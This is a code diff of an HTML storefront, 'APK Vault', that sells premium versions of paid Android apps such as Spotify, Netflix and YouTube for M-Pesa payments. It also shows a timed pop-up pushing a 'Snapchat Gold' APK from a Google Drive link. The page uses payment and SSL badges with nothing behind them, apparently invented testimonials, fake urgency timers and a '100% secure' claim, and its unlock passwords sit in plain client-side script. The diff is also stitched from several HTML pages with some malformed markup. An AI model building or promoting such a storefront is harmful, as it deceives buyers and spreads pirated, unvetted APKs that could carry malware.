-            margin: 10% auto;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            position: relative;
+            padding: 25px;
             text-align: center;
         }
-
-        /* Close Button */
-        .close {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            font-size: 22px;
-            cursor: pointer;
-        }
-
-        .description {
-            font-size: 18px;
+        #adModal .description {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 15px;
             color: #333;
         }
-
-        .download-button {
+        body.dark-mode #adModal .description {
+            color: #f5f5f5;
+        }
+        #adModal p {
+            color: #555;
+            margin-bottom: 20px;
+        }
+        body.dark-mode #adModal p {
+            color: #ccc;
+        }
+        #adModal .video-container {
+            margin: 20px 0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        #adModal .download-button {
             display: inline-block;
-            padding: 10px 20px;
-            font-size: 18px;
+            padding: 12px 25px;
+            font-size: 1.1rem;
             color: white;
             background-color: #007bff;
             text-decoration: none;
-            border-radius: 5px;
-            transition: background-color 0.3s;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            font-weight: bold;
         }
-
-        .download-button:hover {
+        #adModal .download-button:hover {
             background-color: #0056b3;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
-
-        .video-container {
-            margin-top: 20px;
-        }
-
-        iframe {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-        }
-
-        .timer {
-            font-size: 24px;
+        #adModal .timer {
+            font-size: 1.5rem;
             font-weight: bold;
             color: #007bff;
-            margin-top: 10px;
+            margin-top: 15px;
         }
     </style>
-</head>
-<body>
 
-<!-- Ad Modal -->
-<div id="adModal" class="modal">
-    <div class="modal-content">
-        <span class="close" onclick="closeAd()">&times;</span>
-        <div class="description">Download the Free Snapchat Gold App now!</div>
-        <p>Available for download at 2:59 AM EAT.</p>
-
-        <!-- YouTube Video Embed -->
-        <div class="video-container">
-            <iframe width="100%" height="200" src="https://www.youtube.com/embed/y8F_ouXuR2A" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
-        </div>
-<a id="downloadBtn" class="download-button" href="#" onclick="checkDownload(event)">Download Now</a>
-
-<script>
-    function checkDownload(event) {
-        event.preventDefault(); // Prevent link from opening automatically
-
-        const now = new Date();
-        const hours = now.getHours(); // 24-hour format
-        const minutes = now.getMinutes();
-
-        // Allow download only at exactly or after 2:59 AM (02:59)
-        if (hours === 2 && minutes >= 59) {
-            window.location.href = "https://drive.google.com/file/d/14quP9W5d1V55uIxp73ZgonOqvN3k04W-/view?usp=sharing";
-        } else if (hours > 2) { 
-            // If it's later than 2:59 AM (e.g., 3:00 AM, 4 AM, etc.), allow download
-            window.location.href = "https://drive.google.com/file/d/14quP9W5d1V55uIxp73ZgonOqvN3k04W-/view?usp=sharing";
-        } else {
-            // If it's before 2:59 AM, show a warning
-            alert("Download available at 2:59 AM only.");
-        }
-    }
-</script>
-
-
-        <!-- Timer Display -->
-        <div class="timer" id="countdown"></div>
-    </div>
-</div>
-
-<script>
-    let adInterval;
-
-    function showAd() {
-        document.getElementById("adModal").style.display = "block";
-
-        // Start countdown when the ad appears
-        startCountdown();
-
-        // Set an interval to show the ad every 50 seconds
-        if (!adInterval) {
-            adInterval = setInterval(function() {
-                document.getElementById("adModal").style.display = "block";
-                startCountdown();
-            }, 50000); // 50 seconds
-        }
-    }
-
-    function closeAd() {
-        document.getElementById("adModal").style.display = "none";
-    }
-
-    // Countdown Timer
-    function startCountdown() {
-        let countdownDate = new Date();
-        countdownDate.setMinutes(countdownDate.getMinutes() + 5); // 5 min timer
-
-        let countdownFunction = setInterval(function() {
-            let now = new Date().getTime();
-            let distance = countdownDate - now;
-
-            if (distance <= 0) {
-                clearInterval(countdownFunction);
-                document.getElementById("countdown").innerHTML = "Offer Expired!";
-            } else {
-                let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                let seconds = Math.floor((distance % (1000 * 60)) / 1000);
-                document.getElementById("countdown").innerHTML = minutes + "m " + seconds + "s";
-            }
-        }, 1000);
-    }
-
-    // First ad appearance after 5 seconds
-    setTimeout(showAd, 5000);
-</script>
-
-</body>
-</html>
-
-<!-- App 5 -->
-<div class="app-item">
-    <h3>App 5: Truecaller Gold</h3>
-    <div class="app-info">
-        <img src="IMAGES/TruecallerGold.jpg" alt="Truecaller Gold app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Block spam calls, customize your caller ID, and access priority support with Truecaller Gold.</p>
-    <p class="price">Ksh 180</p>
-    
-    <!-- Buttons in a container for horizontal alignment -->
-    <div class="button-container">
-        <button class="cta-button" onclick="openRequestForm('Truecaller Gold', 'PASSWORD456', 'Truecaller_Gold.apk')">Buy Now</button>
-        <button class="expand-btn" onclick="toggleDemo('demo5')">Show Demo</button>
-    </div>
-
-    <div id="demo5" class="demo-content" style="display: none;">
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-   <iframe width="560" height="315" src="https://www.youtube.com/embed/kleqKndSsO0?si=BriKlQ2g72BqiiNd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"Truecaller Gold has made managing my calls so much easier! I no longer get spam calls. A must-have!" — Emily W.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 6 -->
-<div class="app-item">
-    <h3>App 6: Spotify Premium</h3>
-    <div class="app-info">
-        <img src="IMAGES/SpotifyPremium.jpg" alt="Spotify Premium app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Enjoy ad-free music, offline listening, unlimited skips, and high-quality audio with Spotify Premium.</p>
-    <p class="price">Ksh 250</p>
-    
-    <!-- Buttons in a container for horizontal alignment -->
-    <div class="button-container">
-        <button class="cta-button" onclick="openRequestForm('Spotify Premium', 'PASSWORD456premium', 'Spotify_Premium.apk')">Buy Now</button>
-        <button class="expand-btn" onclick="toggleDemo('demo6')">Show Demo</button>
-    </div>
-
-    <div id="demo6" class="demo-content" style="display: none;">
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/eH8t7ZQQaNg?si=lUz-eiYwQlSBDqXJ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"Spotify Premium transformed my music experience. I can listen without interruptions and offline too!" — Michael B.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 7 -->
-<div class="app-item">
-    <h3>App 7: YouTube Premium</h3>
-    <div class="app-info">
-        <img src="IMAGES/YouTubePremium.jpg" alt="YouTube Premium app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Watch ad-free videos, enjoy offline playback, and stream YouTube Music with YouTube Premium.</p>
-    <p class="price">Ksh 200</p>
-    
-    <!-- Buttons in a container for horizontal alignment -->
-    <div class="button-container">
-        <button class="cta-button" onclick="openRequestForm('YouTube Premium', 'PASSyoupWORD456', 'YouTube_Premium.apk')">Buy Now</button>
-        <button class="expand-btn" onclick="toggleDemo('demo7')">Show Demo</button>
-    </div>
-
-    <div id="demo7" class="demo-content" style="display: none;">
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/NiO0FwlvwZ0?si=qAlG95axxcAuDsae" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"Ad-free YouTube is a game changer! The offline feature is amazing too." — Lisa F.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 8 -->
-<div class="app-item">
-    <h3>App 8: Startimes VIP On</h3>
-    <div class="app-info">
-        <img src="IMAGES/StartimesVIPOn.jpg" alt="Startimes VIP On app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Access exclusive movies, sports, and on-demand content in HD with StarTimes VIP On streaming.</p>
-    <p class="price">Ksh 280</p>
-    
-    <!-- Buttons in a container for horizontal alignment -->
-    <div class="button-container">
-        <button class="cta-button" onclick="openRequestForm('Startimes On', 'StartPASSWORD456', 'Startimes_On.apk')">Buy Now</button>
-        <button class="expand-btn" onclick="toggleDemo('demo8')">Show Demo</button>
-    </div>
-
-    <div id="demo8" class="demo-content" style="display: none;">
-       <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <<iframe width="560" height="315" src="https://www.youtube.com/embed/8QZwEaRbv9Y?si=zwE94uW1KxUWOWK-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"StarTimes VIP On has great content, especially for sports lovers. HD quality streaming is perfect!" — John K.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 9 -->
-<div class="app-item">
-    <h3>App 9: Audiomark</h3>
-    <div class="app-info">
-        <img src="IMAGES/Audiomark.jpg" alt="Audiomark app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Enjoy unlimited music streaming with Audiomark, offering a wide variety of local and international music content.</p>
-    <p class="price">Ksh 250</p>
-    
-    <!-- Buttons in a container for horizontal alignment -->
-    <div class="button-container">
-        <button class="cta-button" onclick="openRequestForm('Audiomark', 'AudiomarkPassword123', 'Audiomark.apk')">Buy Now</button>
-        <button class="expand-btn" onclick="toggleDemo('demo9')">Show Demo</button>
-    </div>
-
-    <div id="demo9" class="demo-content" style="display: none;">
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/LRg1vBu_Wzo?si=gNkzTNZhSHzD8-8Z" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"Audiomark is my go-to app for music streaming. The variety of local and international content is unmatched!" — Kevin L.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 10 -->
-<div class="app-item">
-    <h3>App 10: InShot</h3>
-    <div class="app-info">
-        <img src="IMAGES/InShot.jpg" alt="InShot app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>InShot is the perfect app for editing videos and photos with various effects, filters, and more for social media sharing.</p>
-    <p class="price">Ksh 200</p>
-    
-    <!-- Buttons in a container for horizontal alignment -->
-    <div class="button-container">
-        <button class="cta-button" onclick="openRequestForm('InShot', 'InShotPassword123', 'InShot.apk')">Buy Now</button>
-        <button class="expand-btn" onclick="toggleDemo('demo10')">Show Demo</button>
-    </div>
-
-    <div id="demo10" class="demo-content" style="display: none;">
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/5zuzpL1ZC38?si=rXxN-Owap7Wve1oq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"InShot has all the tools I need for video and photo editing. Perfect for quick edits before sharing on social media!" — Rachel J.</p>
-        </div>
-    </div>
-</div>
-
-
-
-<style>
-    .app-info {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-
-    .app-image {
-        width: 100%;
-        max-width: 300px;
-        height: auto;
-    }
-
-    .payment-logo, .ssl-logo {
-        width: 40px;
-        margin: 5px;
-    }
-
-    .badges {
-        display: flex;
-        align-items: center;
-    }
-
-    .app-demo, .testimonials {
-        margin-top: 20px;
-        text-align: center;
-    }
-
-    .cta-button {
-        background-color: #4CAF50;
-        color: white;
-        padding: 10px 20px;
-        border: none;
-        cursor: pointer;
-        font-size: 16px;
-    }
-
-    .cta-button:hover {
-        background-color: #45a049;
-    }
-
-    .expand-btn {
-        background-color: #2196F3;
-        color: white;
-        padding: 5px 15px;
-        border: none;
-        cursor: pointer;
-        font-size: 14px;
-        margin-top: 10px;
-    }
-
-    .expand-btn:hover {
-        background-color: #0b7dda;
-    }
-</style>
-
-
-
-<script>
-    function toggleDemo(demoId) {
-        var demoSection = document.getElementById(demoId);
-        if (demoSection.style.display === "none") {
-            demoSection.style.display = "block";
-        } else {
-            demoSection.style.display = "none";
-        }
-    }
-</script>
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security & FAQ</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 50px;
-        }
-        .section {
-            width: 90%;
-            max-width: 600px;
-            margin: auto;
-            padding: 20px;
-            border-radius: 8px;
-            background: #f9f9f9;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
-        }
-        .badges img {
-            width: 80px;
-            margin: 10px;
-        }
-        .faq-item {
-            border-bottom: 1px solid #ddd;
-            padding: 10px;
-            cursor: pointer;
-            text-align: left;
-        }
-        .faq-item:last-child {
-            border-bottom: none;
-        }
-        .faq-answer {
-            display: none;
-            padding: 10px;
-            color: #333;
-            background: #fff;
-        }
-    </style>
-</head>
-<body>
-    
-    <div class="section">
-        <h2>🔒 Secure Payments</h2>
-        <p>We use **SSL encryption** to keep your transactions safe.</p>
-        <p>Your payment details are **100% secure** and never stored.</p>
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Secure_Payment.png" alt="Secure Checkout">
-        </div>
-    </div>
-    
-    <div class="section">
-        <h2>❓ Frequently Asked Questions</h2>
-        <div class="faq-item" onclick="toggleFAQ(0)">
-            <strong>📥 How do I download my purchased app?</strong>
-            <div class="faq-answer">After purchase, you will receive a download link via email.</div>
-        </div>
-        <div class="faq-item" onclick="toggleFAQ(1)">
-            <strong>📌 Do I get lifetime updates?</strong>
-            <div class="faq-answer">Yes! You get free updates for all purchased apps.</div>
-        </div>
-        <div class="faq-item" onclick="toggleFAQ(2)">
-            <strong>💰 What is the refund policy?</strong>
-            <div class="faq-answer">We offer a 7-day money-back guarantee if you're not satisfied.</div>
-        </div>
-    </div>
-    
     <script>
+        // Global variables
+        let appPasswords = {
+            'Task Manager': {password: 'PASSWORD123', downloadLink: 'task_manager.apk'},
+            'Fitness Tracker': {password: 'PASSWORD456', downloadLink: 'fitness_tracker.apk'},
+            'Peacock Premium': {password: 'PEACOCK456', downloadLink: 'Peacock_Premium.apk'},
+            'Netflix Premium': {password: 'PASSWORD0000456', downloadLink: 'Netflix_Premium.apk'},
+            'Truecaller Gold': {password: 'PASSWORD456', downloadLink: 'Truecaller_Gold.apk'},
+            'Spotify Premium': {password: 'PASSWORD456premium', downloadLink: 'Spotify_Premium.apk'},
+            'YouTube Premium': {password: 'PASSyoupWORD456', downloadLink: 'YouTube_Premium.apk'},
+            'Startimes On': {password: 'StartPASSWORD456', downloadLink: 'Startimes_On.apk'},
+            'Audiomark': {password: 'AudiomarkPassword123', downloadLink: 'Audiomark.apk'},
+            'InShot': {password: 'InShotPassword123', downloadLink: 'InShot.apk'}
+        };
+
+        let currentApp = '';  
+        let currentAppPassword = '';  
+        let userPasswordMethod = ''; 
+        let adInterval;
+
+        // Open request form with app details
+        function openRequestForm(appName, password, downloadLink) {
+            document.getElementById('form-container').style.display = 'block';
+            document.getElementById('appname').value = appName;
+            currentApp = appName;
+            currentAppPassword = password; 
+            if (appPasswords[appName]) {
+                appPasswords[appName].downloadLink = downloadLink;
+            }
+            
+            // Scroll to form
+            document.getElementById('form-container').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Handle form submission
+        function submitForm(event) {
+            event.preventDefault();
+            
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const appname = document.getElementById('appname').value;
+            const description = document.getElementById('description').value;
+            const passwordMethod = document.querySelector('input[name="password-method"]:checked').value;
+
+            // Construct the mailto link with form data
+            let mailtoLink = `mailto:hello.innovrse@gmail.com?subject=APK Vault Request for ${appname}&body=Name: ${name}%0AEmail: ${email}%0AApp Name: ${appname}%0ADescription: ${description}%0APassword Method: ${passwordMethod}`;
+
+            // Open the email client with the populated data
+            window.location.href = mailtoLink;
+
+            // Show confirmation message
+            alert("Your request has been submitted! Please wait while we verify your payment.");
+            
+            setTimeout(function() {
+                alert("Once verified! The password will be sent to your chosen method within 10 minutes.");
+                document.getElementById('vault').style.display = 'block';
+                document.getElementById('vault').scrollIntoView({ behavior: 'smooth' });
+            }, 2000);
+        }
+
+        // Toggle FAQ answers
         function toggleFAQ(index) {
             let answers = document.querySelectorAll(".faq-answer");
             let isVisible = answers[index].style.display === "block";
             answers.forEach(answer => answer.style.display = "none");
             answers[index].style.display = isVisible ? "none" : "block";
         }
-    </script>
-</body>
-</html>
 
+        // Toggle demo sections
+        function toggleDemo(demoId) {
+            var demoSection = document.getElementById(demoId);
+            if (demoSection.style.display === "none" || demoSection.style.display === "") {
+                demoSection.style.display = "block";
+            } else {
+                demoSection.style.display = "none";
+            }
+        }
 
+        // Password Checking Function for Vault Access
+        function checkPassword() {
+            let enteredPassword = document.getElementById('vault-password').value;
+            if (enteredPassword === currentAppPassword) {
+                document.getElementById('download-link').style.display = 'block';
+                document.getElementById('apk-link').href = '/downloads/' + (appPasswords[currentApp]?.downloadLink || '');
+                document.getElementById('password-message').style.display = 'none';
+                
+                // Scroll to download link
+                document.getElementById('download-link').scrollIntoView({ behavior: 'smooth' });
+            } else {
+                alert("Incorrect password. Please try again.");
+                document.getElementById('vault-password').focus();
+            }
+        }
 
+        // Countdown Timer for Discount
+        function startCountdown() {
+            document.getElementById("countdown").style.display = 'block';
+            
+            let countdownDate = new Date();
+            countdownDate.setMinutes(countdownDate.getMinutes() + 30); // 30 minutes countdown
+            
+            let countdownFunction = setInterval(function() {
+                let now = new Date().getTime();
+                let distance = countdownDate - now;
+                
+                if (distance <= 0) {
+                    clearInterval(countdownFunction);
+                    document.getElementById("countdown").style.display = 'none';
+                } else {
+                    let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                    let seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                    document.getElementById("time").innerHTML = minutes + "m " + seconds + "s";
+                }
+            }, 1000);
+        }
 
+        // Snapchat Gold Ad functions
+        function checkDownload(event) {
+            event.preventDefault();
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes();
 
+            if ((hours === 2 && minutes >= 59) || hours > 2) {
+                window.location.href = "https://drive.google.com/file/d/14quP9W5d1V55uIxp73ZgonOqvN3k04W-/view?usp=sharing";
+            } else {
+                alert("Download available at 2:59 AM only.");
+            }
+        }
 
+        function showAd() {
+            document.getElementById("adModal").style.display = "block";
+            startAdCountdown();
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Policy Accordion</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 50px;
+            if (!adInterval) {
+                adInterval = setInterval(function() {
+                    document.getElementById("adModal").style.display = "block";
+                    startAdCountdown();
+                }, 300000); // 5 minutes
+            }
         }
-        .accordion {
-            width: 90%;
-            max-width: 600px;
-            margin: auto;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            overflow: hidden;
+
+        function closeAd() {
+            document.getElementById("adModal").style.display = "none";
         }
-        .accordion-header {
-            background: #007BFF;
-            color: white;
-            padding: 15px;
-            cursor: pointer;
-            text-align: left;
-            font-size: 18px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+
+        function startAdCountdown() {
+            let countdownDate = new Date();
+            countdownDate.setMinutes(countdownDate.getMinutes() + 5);
+
+            let countdownFunction = setInterval(function() {
+                let now = new Date().getTime();
+                let distance = countdownDate - now;
+
+                if (distance <= 0) {
+                    clearInterval(countdownFunction);
+                    document.getElementById("countdown").innerHTML = "Offer Expired!";
+                } else {
+                    let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                    let seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                    document.getElementById("countdown").innerHTML = minutes + "m " + seconds + "s";
+                }
+            }, 1000);
         }
-        .accordion-header:hover {
-            background: #0056b3;
-        }
-        .accordion-content {
-            display: none;
-            padding: 15px;
-            background: #f9f9f9;
-            text-align: left;
-            border-top: 1px solid #ccc;
-        }
-        .arrow {
-            transition: transform 0.3s;
-        }
-        .arrow.rotate {
-            transform: rotate(180deg);
-        }
-    </style>
-</head>
-<body>
-    <div class="accordion">
-        <div class="accordion-header" id="privacyToggle">
-            Privacy Policy
-            <span class="arrow">▼</span>
-        </div>
-        <div class="accordion-content" id="privacyContent">
-            <p>Your privacy is important to us. We collect minimal data required for transactions and do not share your information with third parties.</p>
-            <p>By using our services, you agree to our data collection practices, which include order details and customer support interactions.</p>
-            <p>For more details, visit our <a href="/terms">Terms & Conditions</a>.</p>
-        </div>
-    </div>
-    
-    <script>
+
+        // Initialize Privacy Policy accordion
         document.addEventListener("DOMContentLoaded", function () {
             const toggle = document.getElementById("privacyToggle");
             const content = document.getElementById("privacyContent");
@@ -1594,290 +1457,45 @@
                 content.style.display = isOpen ? "none" : "block";
                 arrow.classList.toggle("rotate", !isOpen);
             });
-        });
-    </script>
-</body>
-</html>
 
-
-    </div>
-</section>
-
-<section id="request-form">
-    <div class="form-container" id="form-container" style="display:none;">
-        <h3>Request Your App</h3>
-        <form id="request-form" onsubmit="submitForm(event)">
-            <label for="name">Your Name:</label>
-            <input type="text" id="name" name="name" placeholder="Full Name(optional)" required>
-
-            <label for="email">Your Email:</label>
-            <input type="email" id="email" name="email" placeholder="Active Email" required>
-
-            <label for="appname">App Name:</label>
-            <input type="text" id="appname" name="appname" readonly required>
-
-            <label for="description"> Mpesa message:</label>
-            <textarea id="description" name="description" rows="8" placeholder="Pochi:0701211452"></textarea>
-
-            <h3>How would you like to receive the password?</h3>
-            <label for="password-method-email">
-                <input type="radio" id="password-method-email" name="password-method" value="email" required> Email
-            </label>
-            <label for="password-method-whatsapp">
-                <input type="radio" id="password-method-whatsapp" name="password-method" value="whatsapp" required> WhatsApp
-            </label>
-            <label for="password-method-sms">
-                <input type="radio" id="password-method-sms" name="password-method" value="sms" required> SMS
-            </label>
-
-            <button type="submit">Submit Request</button>
-        </form>
-        
-        <!-- Optional: Displaying feedback messages -->
-        <div id="form-response" style="display:none;"></div>
-    </div>
-</section>
-
-<section id="vault" class="vault-container">
-    <h3>Enter the Password to Access the APK Vault</h3>
-    <input type="text" id="vault-password" placeholder="Enter Password">
-    <button onclick="checkPassword()">Access Vault</button>
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSS Art Gallery</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; padding: 20px; }
-        .art { margin: 10px; }
-        .art-box { width: 100px; height: 100px; border: 1px solid #ccc; display: inline-block; margin: 5px; }
-        .art-input { margin-bottom: 10px; }
-    </style>
-</head>
-<body>
-    <h1>CSS Art Gallery</h1>
-    <input type="text" id="cssArt" class="art-input" placeholder="e.g background-color: red;">
-    <button id="addArt">Add Art</button>
-    <div id="artGallery"></div>
-    
-    <script src="artgallery.js"></script>
-</body>
-</html>
-
-
-
-
-
-    <div id="download-link" style="display: none;">
-        <p>Your APK download link: <a href="#" id="apk-link" target="_blank">Download APK</a></p>
-    </div>
-
-    <div id="password-message" style="display: none;">
-        <p>The password will be sent to your selected method (Email, WhatsApp, or SMS) within 10 minutes after payment verification.</p>
-    </div>
-</section>
-
-<!-- Countdown Message for Time-Based Discount -->
-<div id="countdown" style="display: none;">
-    <p>Hurry up! Get 20% off your next purchase! Offer ends in <span id="time"></span></p>
-</div>
-
-<footer class="footer">
-    <p>&copy; 2024 APK Vault. All rights reserved.</p>
-    <p>Send payment to MPesa number: <strong>0701211452</strong></p>
-</footer>
-
-<script>
-    let appPasswords = {
-        'Task Manager': {password: 'PASSWORD123', downloadLink: 'task_manager.apk'},
-        'Fitness Tracker': {password: 'PASSWORD456', downloadLink: 'fitness_tracker.apk'}
-    };
-
-    let currentApp = '';  
-    let currentAppPassword = '';  
-    let userPasswordMethod = ''; 
-
-    function openRequestForm(appName, password, downloadLink) {
-        document.getElementById('form-container').style.display = 'block';
-        document.getElementById('appname').value = appName;
-        currentApp = appName;
-        currentAppPassword = password; 
-        appPasswords[appName].downloadLink = downloadLink; 
-    }
-
-    // Handle form submission and send email
-    function submitForm(event) {
-        event.preventDefault();  // Prevent the form from submitting immediately
-
-        const name = document.getElementById('name').value;
-        const email = document.getElementById('email').value;
-        const appname = document.getElementById('appname').value;
-        const description = document.getElementById('description').value;
-        const passwordMethod = document.querySelector('input[name="password-method"]:checked').value;
-
-        // Construct the mailto link with form data
-        let mailtoLink = `mailto:hello.innovrse@gmail.com?subject=APK Vault Request for ${appname}&body=Name: ${name}%0AEmail: ${email}%0AApp Name: ${appname}%0ADescription: ${description}%0APassword Method: ${passwordMethod}`;
-
-        // Open the email client with the populated data
-        window.location.href = mailtoLink;
-
-        // Show confirmation message
